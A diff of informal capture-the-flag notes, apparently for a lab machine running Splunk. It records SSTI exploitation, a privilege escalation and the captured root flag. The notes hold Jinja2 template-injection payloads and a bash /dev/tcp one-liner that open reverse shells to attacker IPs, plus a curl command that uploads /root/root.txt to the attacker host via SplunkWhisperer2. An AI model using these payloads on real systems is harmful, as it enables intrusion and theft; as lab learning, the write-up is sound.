@@ -17,7 +17,7 @@ thomas got the revershell using putting the payload at the post and going to `/a
 
 Like an idiot used the config payload from payload all the things SSTI `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection`
 `{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}` and got an http 500 error, will try the direct bash one and see if it works.
-
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.138\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 Trying the following payload to see if it , works, its mentioned specifically for reverse shell
 `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`
 
@@ -34,3 +34,18 @@ Once got the initial shell, I tried making it better by `import pty;pty.spawn("/
 So we have password for something , on our inital shells we found, `shaun and web` in the home directory, so i tried using ssh to shaun with the password `Guitar123` and it didnt work .
 so i tried getting a better shell from the initial one, and as i noticed python didnt work i tried python3 via `python3 -c 'import pty;pty.spawn("/bin/bash");'`, then i did an `su shaun` with the password `Guitar123` and bam i was in.
 then i did a cat /home/shaun/user.txt and got the first flag.
+
+performed `sudo -l`
+on googling splunk priv esc i found the following [link](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2), Thomas got the root flag using this so i will copy the repo and use remote python file
+
+using `wget wget https://raw.githubusercontent.com/cnotin/SplunkWhisperer2/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py`
+
+start your netcat listener via `nc -nvlp 4444`
+and then use the following command with parameters as mentioned on the github:
+`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "curl -F 'data=@/root/root.txt ' http://10.10.14.94:4444" --lhost 10.10.14.94`
+
+the root flag is `"root.txt"
+Content-Type: text/plain
+
+b84324f504a2cac86148687325cf3573
+`
